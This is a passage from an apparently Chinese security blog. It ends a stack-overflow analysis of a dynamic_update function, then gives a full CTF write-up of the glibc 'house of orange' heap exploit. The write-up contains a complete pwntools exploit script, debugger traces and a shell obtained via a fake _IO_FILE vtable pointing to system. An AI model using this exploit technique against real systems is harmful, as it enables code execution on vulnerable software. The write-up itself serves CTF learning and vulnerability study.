&apos;&amp;ip=%s&apos; vararg: 0x80573bc (IPaddress) ◂— 0x41414141 (&apos;AAAA&apos;) 0x804c055 &lt;dynamic_update+114&gt; lea eax, [ebp - 0x128] 0x804c05b &lt;dynamic_update+120&gt; mov dword ptr [esp + 4], eax 0x804c05f &lt;dynamic_update+124&gt; mov dword ptr [esp], buffer &lt;0x8053020&gt; 0x804c066 &lt;dynamic_update+131&gt; call strcat@plt &lt;0x80491f8&gt; 0x804c06b &lt;dynamic_update+136&gt; mov dword ptr [ebp - 0x24], buffer+8192 &lt;0x8055020&gt; 我们再看看IPaddress的位置 1234567891011121314151617181920db-peda$ x /76wx 0x80573bc0x80573bc &lt;IPaddress&gt;: 0x41414141 0x41414141 0x41414141 0x414141410x80573cc: 0x41414141 0x41414141 0x41414141 0x414141410x80573dc: 0x41414141 0x41414141 0x41414141 0x414141410x80573ec: 0x41414141 0x41414141 0x41414141 0x414141410x80573fc: 0x41414141 0x41414141 0x41414141 0x414141410x805740c: 0x41414141 0x41414141 0x41414141 0x414141410x805741c: 0x41414141 0x41414141 0x41414141 0x414141410x805742c: 0x41414141 0x41414141 0x41414141 0x414141410x805743c: 0x41414141 0x41414141 0x41414141 0x414141410x805744c: 0x41414141 0x41414141 0x41414141 0x414141410x805745c: 0x41414141 0x41414141 0x41414141 0x414141410x805746c: 0x41414141 0x41414141 0x41414141 0x414141410x805747c: 0x41414141 0x41414141 0x41414141 0x414141410x805748c: 0x41414141 0x41414141 0x41414141 0x414141410x805749c: 0x41414141 0x41414141 0x41414141 0x414141410x80574ac: 0x41414141 0x41414141 0x41414141 0x414141410x80574bc: 0x41414141 0x41414141 0x41414141 0x414141410x80574cc: 0x41414141 0x41414141 0x41414141 0x414141410x80574dc: 0x41414141 0x41414141 0x41414141 0x00000000 可以看到确实是sprintf的时候溢出的，我们不断单步到ret，确实返回地址被覆盖成0x41414141了 123456789101112131415161718192021222324252627282930313233 EAX 0xffffffff EBX 0x0 ECX 0xffffffff EDX 0xf7fb8864 (_IO_stdfile_2_lock) ◂— 0 EDI 0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov al, 0x1d /* 0x1b1db0 */ ESI 0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov al, 0x1d /* 0x1b1db0 */ EBP 0x41414141 (&apos;AAAA&apos;) ESP 0xffffd40c ◂— &apos;AAAA&apos; EIP 0x804c3e8 (dynamic_update+1029) ◂— ret ───────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────── 0x804c25f &lt;dynamic_update+636&gt; je dynamic_update+1013 &lt;0x804c3d8&gt; ↓ 0x804c3d8 &lt;dynamic_update+1013&gt; mov eax, dword ptr [ebp - 0x18] 0x804c3db &lt;dynamic_update+1016&gt; mov dword ptr [ebp - 0x32c], eax 0x804c3e1 &lt;dynamic_update+1022&gt; mov eax, dword ptr [ebp - 0x32c] 0x804c3e7 &lt;dynamic_update+1028&gt; leave ► 0x804c3e8 &lt;dynamic_update+1029&gt; ret &lt;0x41414141&gt;────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd40c ◂— &apos;AAAA&apos;01:0004│ 0xffffd410 —▸ 0x804f100 ◂— dec ecx02:0008│ 0xffffd414 —▸ 0xffffd4c4 —▸ 0xffffd60b ◂— 0x6d6f682f (&apos;/hom&apos;)03:000c│ 0xffffd418 —▸ 0x8053020 (buffer) ◂— 0x2054450004:0010│ 0xffffd41c —▸ 0xf7ffd918 ◂— 005:0014│ 0xffffd420 —▸ 0x8052520 (__libc_start_main@got.plt) —▸ 0xf7e1d540 (__libc_start_main) ◂— call 0xf7f24b5906:0018│ 0xffffd424 —▸ 0x8053020 (buffer) ◂— 0x2054450007:001c│ 0xffffd428 ◂— 0x0──────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────── ► f 0 804c3e8 dynamic_update+1029 f 1 41414141 简单总结所以漏洞成因就是dynamic_update中的sprintf(&amp;s, &quot;&amp;ip=%s&quot;, &amp;IPaddress);拼接，建议使用snprintf referencehttps://www.exploit-db.com/exploits/25411","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://www.giantbranch.cn/tags/漏洞分析/"},{"name":"溢出","slug":"溢出","permalink":"https://www.giantbranch.cn/tags/溢出/"}]},{"title":"CTF PWN之house of orange","slug":"CTF PWN之house of orange","date":"2018-12-29T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/12/29/CTF PWN之house of orange/","link":"","permalink":"https://www.giantbranch.cn/2018/12/29/CTF PWN之house of orange/","excerpt":"","text":"题目链接：https://github.com/giantbranch/CTF_PWN/tree/master/other/houseoforange 讲解题目这是一个HITCON中的经典题目了，通过对buildhouse函数的逆向可以得到下面两个结构体 123456789struct house&#123; struct orange* point; qword* name;&#125;struct orange&#123; dword price dword color;&#125; 所以在ida新建结构体，当然这题好像没啥太大的帮助 12345678910111213141500000000 orange struc ; (sizeof=0x8, mappedto_6)00000000 ; XREF: house/r00000000 price dd ?00000004 color dd ?00000008 orange ends0000000800000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Rela. PRESS CTRL-NUMPAD+ TO EXPAND]00000000 ; ---------------------------------------------------------------------------0000000000000000 house struc ; (sizeof=0x10, mappedto_7)00000000 orangePoint orange ?00000008 name dq ?00000010 house ends0000001000000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Dyn. PRESS CTRL-NUMPAD+ TO EXPAND] 保护是全开的 123456Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabledFORTIFY: Enabled 总体思路： 1、通过upgrade的溢出覆盖topchunk size，那么我们再build，原来的topchunk就到unsortbin去了，就有了libc指针 注意：topchunk size的覆盖是有限制的，最低位要是1，跟topchunk的其实地址加起来要跟0x1000对齐，还有要大于MINSIZE （好像是0x10） 12345######### overwrite top chunk sizebuild(0x10, &quot;A&quot;*0x10, 10, 1)upgrade(0x40, &quot;A&quot;*0x10+ p64(0) + p64(0x21) + p64(0x0000001f0000000a) + p64(0) * 2 + p64(0xfa1), 10 , 1)# let top chunk to unsort bin listbuild(0xfb0, &quot;A&quot;*0x10, 10, 1) 2、接下来我们申请一个largebin大小的（因为有fd_nextsize和bk_nextsize，可以泄露heap的地址），我们只覆盖前8个字节就可以leak出libc了 注：64位下，largebin最小大小是0x400，即1024字节，要申请largebin大小，必须大于等于0x3e9 12345678910111213141516######### leak libc# in 64 bit, must malloc more than 0x3e9 to get large binbuild(0x400, &quot;A&quot;*8, 10, 1)# build(0x3e9, &quot;A&quot;*8, 10, 1)see()p.recvuntil(&quot;Name of house : AAAAAAAA&quot;)largebin_leak = u64(p.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &quot;\\x00&quot;))print &quot;largebin_leak = &quot; + hex(largebin_leak)main_arena = largebin_leak - 1640print &quot;main_arena = &quot; + hex(main_arena)libc_base = main_arena - main_arena_offsetprint &quot;libc_base = &quot; + hex(libc_base)system = libc_base + libc.symbols[&apos;system&apos;]_IO_list_all = libc_base + libc.symbols[&apos;_IO_list_all&apos;]print &quot;system = &quot; + hex(system)print &quot;_IO_list_all = &quot; + hex(_IO_list_all) 3、之后再覆盖0x10大小，泄露heap地址 123456# leak heapupgrade(0x20, &quot;A&quot;*0x10, 10 , 1)see()p.recvuntil(&quot;Name of house : AAAAAAAAAAAAAAAA&quot;)heap_addr = u64(p.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &quot;\\x00&quot;))print &quot;heap_addr = &quot; + hex(heap_addr) 4、最后就利用溢出覆盖unsortbin的bk，实行unsortbin attack，将_IO_list_all指针指向了main_arena+0x58，那么链表指针_chain指向了smallbin[4]，即第5个smallbin——0x60大小的。而我们之前就将unsortbin的size改为0x61，所以我们再申请的时候，他首先就会放到smallbin[4],最后我们伪造vtable即可 查看unsortbin位置，可以看到确实chain指向 1234567891011121314151617181920212223242526272829303132333435gdb-peda$ p *((struct _IO_FILE_plus*)0x7f742fb8db78)$13 = &#123; file = &#123; _flags = 0xf12befc0, _IO_read_ptr = 0x559af129d4f0 &quot;&quot;, _IO_read_end = 0x559af129d4f0 &quot;&quot;, _IO_read_base = 0x7f742fb8e510 &quot;&quot;, _IO_write_base = 0x7f742fb8db88 &lt;main_arena+104&gt; &quot;\\360\\324)\\361\\232U&quot;, _IO_write_ptr = 0x7f742fb8db88 &lt;main_arena+104&gt; &quot;\\360\\324)\\361\\232U&quot;, _IO_write_end = 0x7f742fb8db98 &lt;main_arena+120&gt; &quot;\\210?/t\\177&quot;, _IO_buf_base = 0x7f742fb8db98 &lt;main_arena+120&gt; &quot;\\210?/t\\177&quot;, _IO_buf_end = 0x7f742fb8dba8 &lt;main_arena+136&gt; &quot;\\230?/t\\177&quot;, _IO_save_base = 0x7f742fb8dba8 &lt;main_arena+136&gt; &quot;\\230?/t\\177&quot;, _IO_backup_base = 0x7f742fb8dbb8 &lt;main_arena+152&gt; &quot;\\250?/t\\177&quot;, _IO_save_end = 0x7f742fb8dbb8 &lt;main_arena+152&gt; &quot;\\250?/t\\177&quot;, _markers = 0x7f742fb8dbc8 &lt;main_arena+168&gt;, _chain = 0x7f742fb8dbc8 &lt;main_arena+168&gt;, _fileno = 0x2fb8dbd8, _flags2 = 0x7f74, _old_offset = 0x7f742fb8dbd8, _cur_column = 0xdbe8, _vtable_offset = 0xb8, _shortbuf = &quot;/&quot;, _lock = 0x7f742fb8dbe8 &lt;main_arena+200&gt;, _offset = 0x7f742fb8dbf8, _codecvt = 0x7f742fb8dbf8 &lt;main_arena+216&gt;, _wide_data = 0x7f742fb8dc08 &lt;main_arena+232&gt;, _freeres_list = 0x7f742fb8dc08 &lt;main_arena+232&gt;, _freeres_buf = 0x7f742fb8dc18 &lt;main_arena+248&gt;, __pad5 = 0x7f742fb8dc18, _mode = 0x2fb8dc28, _unused2 = &quot;t\\177\\000\\000(?/t\\177\\000\\000\\070?/t&quot;... &#125;, vtable = 0x7f742fb8dc38 &lt;main_arena+280&gt;&#125; 那么整个过程怎么触发的呢？ 我们修改了bk后，那当我们再次申请内存的时候，其他bins都没有可用的，而unsortbin有可用的内存，就会遍历unsortbin列表，不合适就将bin拖链放到对应的bins列表，比如0x60大小的就放到smallbin那里了，这时候就通过unsortbin attack修改了_IO_list_all，即下面代码的bck-&gt;fd = unsorted_chunks (av);，将unsortbin的头指针写到了bck的fd，即我们要写到(_IO_list_all-0x10)-&gt;fd，也即写到_IO_list_all（注：av的类型是malloc_state，即mstate，他指向main_arena），再次遍历下一个时由于size为0即_IO_list_all-8处为0，触发的异常，从而劫持控制力，详细请看附录 1234567891011121314151617while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123; bck = victim-&gt;bk; if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) &gt; av-&gt;system_mem, 0)) malloc_printerr (&quot;malloc(): memory corruption&quot;); size = chunksize (victim); ............. ............. ............. /* remove from unsorted list */ unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); ............. ............. ............. 还有我们伪造的IO_FILE需要满足一些条件，才能调用_IO_OVERFLOW 12345678 if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) 那么_IO_OVERFLOW指针覆盖为system，fp头指针我们设置为/bin/sh 最终即可成功getshell 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051[+] Starting local process &apos;./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682&apos;: pid 6012[*] &apos;/lib/x86_64-linux-gnu/libc.so.6&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabledlargebin_leak = 0x7fbfa9142188main_arena = 0x7fbfa9141b20libc_base = 0x7fbfa8d7d000system = 0x7fbfa8dc2390_IO_list_all = 0x7fbfa9142520heap_addr = 0x55dab4acf0c00x520[*] Switching to interactive mode*** Error in `./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682&apos;: malloc(): memory corruption: 0x00007fbfa9142520 ***======= Backtrace: =========/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbfa8df47e5]/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7fbfa8dff13e]/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7fbfa8e01184]./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682(+0xd6d)[0x55dab2fc4d6d]./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682(+0x1402)[0x55dab2fc5402]/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbfa8d9d830]./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682(+0xb19)[0x55dab2fc4b19]======= Memory map: ========55dab2fc4000-55dab2fc7000 r-xp 00000000 08:01 402634 /home/giantbranch/ctf2018/houseoforange/houseoforange_22785bece84189e632567da38e4be0e0c4bb168255dab31c6000-55dab31c7000 r--p 00002000 08:01 402634 /home/giantbranch/ctf2018/houseoforange/houseoforange_22785bece84189e632567da38e4be0e0c4bb168255dab31c7000-55dab31c8000 rw-p 00003000 08:01 402634 /home/giantbranch/ctf2018/houseoforange/houseoforange_22785bece84189e632567da38e4be0e0c4bb168255dab4acf000-55dab4b12000 rw-p 00000000 00:00 0 [heap]7fbfa4000000-7fbfa4021000 rw-p 00000000 00:00 0 7fbfa4021000-7fbfa8000000 ---p 00000000 00:00 0 7fbfa8b67000-7fbfa8b7d000 r-xp 00000000 08:01 2626521 /lib/x86_64-linux-gnu/libgcc_s.so.17fbfa8b7d000-7fbfa8d7c000 ---p 00016000 08:01 2626521 /lib/x86_64-linux-gnu/libgcc_s.so.17fbfa8d7c000-7fbfa8d7d000 rw-p 00015000 08:01 2626521 /lib/x86_64-linux-gnu/libgcc_s.so.17fbfa8d7d000-7fbfa8f3d000 r-xp 00000000 08:01 2626483 /lib/x86_64-linux-gnu/libc-2.23.so7fbfa8f3d000-7fbfa913d000 ---p 001c0000 08:01 2626483 /lib/x86_64-linux-gnu/libc-2.23.so7fbfa913d000-7fbfa9141000 r--p 001c0000 08:01 2626483 /lib/x86_64-linux-gnu/libc-2.23.so7fbfa9141000-7fbfa9143000 rw-p 001c4000 08:01 2626483 /lib/x86_64-linux-gnu/libc-2.23.so7fbfa9143000-7fbfa9147000 rw-p 00000000 00:00 0 7fbfa9147000-7fbfa916d000 r-xp 00000000 08:01 2626455 /lib/x86_64-linux-gnu/ld-2.23.so7fbfa9351000-7fbfa9354000 rw-p 00000000 00:00 0 7fbfa936b000-7fbfa936c000 rw-p 00000000 00:00 0 7fbfa936c000-7fbfa936d000 r--p 00025000 08:01 2626455 /lib/x86_64-linux-gnu/ld-2.23.so7fbfa936d000-7fbfa936e000 rw-p 00026000 08:01 2626455 /lib/x86_64-linux-gnu/ld-2.23.so7fbfa936e000-7fbfa936f000 rw-p 00000000 00:00 0 7ffc73a63000-7ffc73a84000 rw-p 00000000 00:00 0 [stack]7ffc73b8c000-7ffc73b8f000 r--p 00000000 00:00 0 [vvar]7ffc73b8f000-7ffc73b91000 r-xp 00000000 00:00 0 [vdso]ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]$ iduid=1000(giantbranch) gid=1000(giantbranch) groups=1000(giantbranch) exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-12-29 14:03:27# @Author : giantbranch (giantbranch@gmail.com)# @Link : http://www.giantbranch.cn/# @tags : # struct house&#123;# struct orange* point;# qword* name;# &#125;# struct orange&#123;# dword price# dword color;# &#125;from pwn import *# context.log_level = &quot;debug&quot;p = process(&quot;./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) # 1. Red # 2. Green # 3. Yellow # 4. Blue # 5. Purple # 6. Cyan # 7. White def build(nameLen, name, price, color): p.recvuntil(&quot;Your choice : &quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;Length of name :&quot;) p.sendline(str(nameLen)) p.recvuntil(&quot;Name :&quot;) p.send(name) p.recvuntil(&quot;Price of Orange:&quot;) p.sendline(str(price)) p.recvuntil(&quot;Color of Orange:&quot;) p.sendline(str(color))def see(): p.recvuntil(&quot;Your choice : &quot;) p.sendline(&quot;2&quot;)def upgrade(nameLen, name, price, color): p.recvuntil(&quot;Your choice : &quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;Length of name :&quot;) p.sendline(str(nameLen)) p.recvuntil(&quot;Name:&quot;) p.send(name) p.recvuntil(&quot;Price of Orange:&quot;) p.sendline(str(price)) p.recvuntil(&quot;Color of Orange:&quot;) p.sendline(str(color))def getpid(): print proc.pidof(p)[0] pause()main_arena_offset = 0x3c4b20######### overwrite top chunk sizebuild(0x10, &quot;A&quot;*0x10, 10, 1)upgrade(0x40, &quot;A&quot;*0x10+ p64(0) + p64(0x21) + p64(0x0000001f0000000a) + p64(0) * 2 + p64(0xfa1), 10 , 1)# let top chunk to unsort bin listbuild(0xfb0, &quot;A&quot;*0x10, 10, 1)######### leak libc# in 64 bit, must malloc more than 0x3e9 to get large binbuild(0x400, &quot;A&quot;*8, 10, 1)# build(0x3e9, &quot;A&quot;*8, 10, 1)see()p.recvuntil(&quot;Name of house : AAAAAAAA&quot;)largebin_leak = u64(p.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &quot;\\x00&quot;))print &quot;largebin_leak = &quot; + hex(largebin_leak)main_arena = largebin_leak - 1640print &quot;main_arena = &quot; + hex(main_arena)libc_base = main_arena - main_arena_offsetprint &quot;libc_base = &quot; + hex(libc_base)system = libc_base + libc.symbols[&apos;system&apos;]_IO_list_all = libc_base + libc.symbols[&apos;_IO_list_all&apos;]print &quot;system = &quot; + hex(system)print &quot;_IO_list_all = &quot; + hex(_IO_list_all)# getpid()# leak heapupgrade(0x20, &quot;A&quot;*0x10, 10 , 1)see()p.recvuntil(&quot;Name of house : AAAAAAAAAAAAAAAA&quot;)heap_addr = u64(p.recvuntil(&quot;\\n&quot;)[:-1].ljust(8, &quot;\\x00&quot;))print &quot;heap_addr = &quot; + hex(heap_addr)# unsortbin attack to write _IO_list_allpayload = &quot;A&quot; * 0x400 # paddingpayload += p64(0) + p64(0x21) + p64(0x0000001f0000000a) + p64(0)# fake_file: fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_basefake_file = &quot;/bin/sh\\x00&quot; + p64(0x61) fake_file += p64(0xaabbccdd) + p64(_IO_list_all-0x10) #unsortbin attackfake_file += p64(0) + p64(1) #_IO_write_base &lt; _IO_write_ptrfake_file += p64(0) * 18fake_file += p64(0) # fp-&gt;_mode &lt;= 0fake_file += p64(0) * 2 # _unused2fake_file += p64(heap_addr + 0x510) # vtable_point (point to next)payload += fake_filepayload += p64(0) * 3 # vtablepayload += p64(system) # __overflow &lt;-- systemprint hex(len(payload))# getpid()upgrade(0x6666, payload, 11, 2)# getshellp.recvuntil(&quot;Your choice : &quot;)p.sendline(&quot;1&quot;)p.interactive() 附录——调试最后的流程劫持过程首先下个硬件断点：watch _IO_list_all 断下来，由于开启了源码调试，我们看源码吧，bck-&gt;fd = unsorted_chunks (av);就是将unsorted_bin的头指针写到_IO_list_all的代码 1234567891011 3515 unsorted_chunks (av)-&gt;bk = bck; 3516 bck-&gt;fd = unsorted_chunks (av); 3517 3518 /* Take now instead of binning if exact fit */ 3519 ► 3520 if (size == nb) 3521 &#123; 3522 set_inuse_bit_at_offset (victim, size); 3523 if (av != &amp;main_arena) 3524 victim-&gt;size |= NON_MAIN_ARENA; 3525 check_malloced_chunk (av, victim, nb); 继续调试 下面的代码是不会进去的，因为这是刚好满足的情况 123456789101112/* Take now instead of binning if exact fit */ if (size == nb) &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; 接下来是进入这里 123456 3533 if (in_smallbin_range (size)) 3534 &#123;► 3535 victim_index = smallbin_index (size); 3536 bck = bin_at (av, victim_index); 3537 fwd = bck-&gt;fd; 3538 &#125; 接下来的操作是,将这个chunk放到对应的bin上，比如这里就放到0x60的bins上 12345mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim; 此时这个0x60大小的chunk已经放入smallbin了 123gdb-peda$ smallbinsmallbins0x60: 0x55bc09c5a4f0 —▸ 0x7f32413d8bc8 (main_arena+168) ◂— 0x55bc09c5a4f0 接下来就去下一个unsortbin的chunk了 12345678910113464 */ 3465 3466 for (;; ) 3467 &#123; 3468 int iters = 0;► 3469 while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) 3470 &#123; 3471 bck = victim-&gt;bk; 3472 if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) 3473 || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) 3474 malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;, 接下来由于_IO_list_all那边的size为0 1234567891011gdb-peda$ x /20gx 0x7f32413d95100x7f32413d9510: 0x0000000000000000 0x00000000000000000x7f32413d9520 &lt;_IO_list_all&gt;: 0x00007f32413d8b78 0x00000000000000000x7f32413d9530: 0x0000000000000000 0x00000000000000000x7f32413d9540 &lt;_IO_2_1_stderr_&gt;: 0x00000000fbad2086 0x00000000000000000x7f32413d9550 &lt;_IO_2_1_stderr_+16&gt;: 0x0000000000000000 0x00000000000000000x7f32413d9560 &lt;_IO_2_1_stderr_+32&gt;: 0x0000000000000000 0x00000000000000000x7f32413d9570 &lt;_IO_2_1_stderr_+48&gt;: 0x0000000000000000 0x00000000000000000x7f32413d9580 &lt;_IO_2_1_stderr_+64&gt;: 0x0000000000000000 0x00000000000000000x7f32413d9590 &lt;_IO_2_1_stderr_+80&gt;: 0x0000000000000000 0x00000000000000000x7f32413d95a0 &lt;_IO_2_1_stderr_+96&gt;: 0x0000000000000000 0x00007f32413d9620 具体可以看看调试，rsi为0，就是size为0 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960──────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────── RAX 0x0 RBX 0x7f32413d8b20 (main_arena) ◂— 0x100000001 RCX 0x6 RDX 0x40 RDI 0x7f32413d8bc8 (main_arena+168) —▸ 0x7f32413d8bb8 (main_arena+152) —▸ 0x7f32413d8ba8 (main_arena+136) —▸ 0x7f32413d8b98 (main_arena+120) —▸ 0x7f32413d8b88 (main_arena+104) ◂— ... RSI 0x0 R8 0x7f32413d8bc8 (main_arena+168) —▸ 0x7f32413d8bb8 (main_arena+152) —▸ 0x7f32413d8ba8 (main_arena+136) —▸ 0x7f32413d8b98 (main_arena+120) —▸ 0x7f32413d8b88 (main_arena+104) ◂— ... R9 0x1999999999999999 R10 0x0 R11 0x7f324118b5e0 (_nl_C_LC_CTYPE_class+256) ◂— add al, byte ptr [rax] R12 0x7f32413d8b78 (main_arena+88) —▸ 0x55bc09c7bfc0 ◂— 0x0 R13 0x7f32413d9510 ◂— 0x0 R14 0x270f R15 0x0 RBP 0x20 RSP 0x7ffe04d39120 ◂— 0x2 RIP 0x7f3241095ddc (_int_malloc+604) ◂— cmp rsi, 0x10───────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────── 0x7f3241095dc7 &lt;_int_malloc+583&gt; mov r13, qword ptr [rbx + 0x70] 0x7f3241095dcb &lt;_int_malloc+587&gt; cmp r13, r12 0x7f3241095dce &lt;_int_malloc+590&gt; je _int_malloc+1511 &lt;0x7f3241096167&gt; 0x7f3241095dd4 &lt;_int_malloc+596&gt; mov rsi, qword ptr [r13 + 8] 0x7f3241095dd8 &lt;_int_malloc+600&gt; mov r15, qword ptr [r13 + 0x18] ► 0x7f3241095ddc &lt;_int_malloc+604&gt; cmp rsi, 0x10 0x7f3241095de0 &lt;_int_malloc+608&gt; jbe _int_malloc+960 &lt;0x7f3241095f40&gt; ↓ 0x7f3241095f40 &lt;_int_malloc+960&gt; mov r10d, dword ptr [rip + 0x342209] &lt;0x7f32413d8150&gt; 0x7f3241095f47 &lt;_int_malloc+967&gt; or dword ptr [rbx + 4], 4 0x7f3241095f4b &lt;_int_malloc+971&gt; mov eax, r10d 0x7f3241095f4e &lt;_int_malloc+974&gt; and eax, 5────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────────In file: /home/giantbranch/glibc-2.23/malloc/malloc.c 3467 &#123; 3468 int iters = 0; 3469 while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) 3470 &#123; 3471 bck = victim-&gt;bk; ► 3472 if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) 3473 || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) 3474 malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;, 3475 chunk2mem (victim), av); 3476 size = chunksize (victim); 3477 ────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────00:0000│ rsp 0x7ffe04d39120 ◂— 0x201:0008│ 0x7ffe04d39128 ◂— 0x1002:0010│ 0x7ffe04d39130 —▸ 0x7ffe04d391a0 ◂— 0xa /* &apos;\\n&apos; */03:0018│ 0x7ffe04d39138 —▸ 0x7ffe04d39340 ◂— 0x104:0020│ 0x7ffe04d39140 ◂— 0x0... ↓06:0030│ 0x7ffe04d39150 ◂— 0xffff8001fb2c6e6107:0038│ 0x7ffe04d39158 —▸ 0x7ffe04d3919f ◂— 0xa00──────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────── ► f 0 7f3241095ddc _int_malloc+604 f 1 7f3241098184 malloc+84 f 2 55bc08934d6d f 3 55bc08935402 f 4 7f3241034830 __libc_start_main+240 那么接下来就进入了malloc_printerr这个函数了 12► 3474 malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;, 3475 chunk2mem (victim), av); 接下来直接运行，崩溃，可以看到调用顺序是malloc_printerr----&gt;__libc_message----&gt;__GI_abort----&gt;_IO_flush_all_lockp 123456789101112gdb-peda$ bt#0 0x00007f32413d8c38 in main_arena () from /lib/x86_64-linux-gnu/libc.so.6#1 0x00007f3241090196 in _IO_flush_all_lockp (do_lock=do_lock@entry=0x0) at genops.c:786#2 0x00007f324104afbd in __GI_abort () at abort.c:74#3 0x00007f324108b7ea in __libc_message (do_abort=0x2, fmt=fmt@entry=0x7f32411a4ed8 \"*** Error in `%\"...) at ../sysdeps/posix/libc_fatal.c:175#4 0x00007f324109613e in malloc_printerr (ar_ptr=0x7f32413d8b20 &lt;main_arena&gt;, ptr=0x7f32413d9520 &lt;_IO_list_all&gt;, str=0x7f32411a1d3f \"malloc(): memor\"..., action=&lt;optimized out&gt;) at malloc.c:5006#5 _int_malloc (av=av@entry=0x7f32413d8b20 &lt;main_arena&gt;, bytes=bytes@entry=0x10) at malloc.c:3474#6 0x00007f3241098184 in __GI___libc_malloc (bytes=0x10) at malloc.c:2913#7 0x000055bc08934d6d in ?? ()#8 0x000055bc08935402 in ?? ()#9 0x00007f3241034830 in __libc_start_main (main=0x55bc089353af, argc=0x1, argv=0x7ffe04d39348, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7ffe04d39338) at ../csu/libc-start.c:291#10 0x000055bc08934b19 in ?? () 所以经过上面的调试你理解4ngelboy的图了吧 附录2：_IO_flush_all_lockp流程首先获取头指针 1234567891011 768 _IO_lock_lock (list_all_lock); 769 #endif 770 771 last_stamp = _IO_list_all_stamp; 772 fp = (_IO_FILE *) _IO_list_all;► 773 while (fp != NULL) 774 &#123; 775 run_fp = fp; 776 if (do_lock) 777 _IO_flockfile (fp); 778 之后就到达判断处 12345► 779 if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) 780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T 781 || (_IO_vtable_offset (fp) == 0 782 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr 783 &gt; fp-&gt;_wide_data-&gt;_IO_write_base)) 由于第一个_IO_FILE_plus条件不满足直接跳过了 1234567891011121314151617181920212223242526272829303132333435gdb-peda$ p *(struct _IO_FILE_plus *)0x7f6d94f61b78$19 = &#123; file = &#123; _flags = 0x660a0fc0, _IO_read_ptr = 0x55fc6607f4f0 &quot;/bin/sh&quot;, _IO_read_end = 0x55fc6607f4f0 &quot;/bin/sh&quot;, _IO_read_base = 0x7f6d94f62510 &quot;&quot;, _IO_write_base = 0x7f6d94f61b88 &lt;main_arena+104&gt; &quot;\\360\\364\\af\\374U&quot;, _IO_write_ptr = 0x7f6d94f61b88 &lt;main_arena+104&gt; 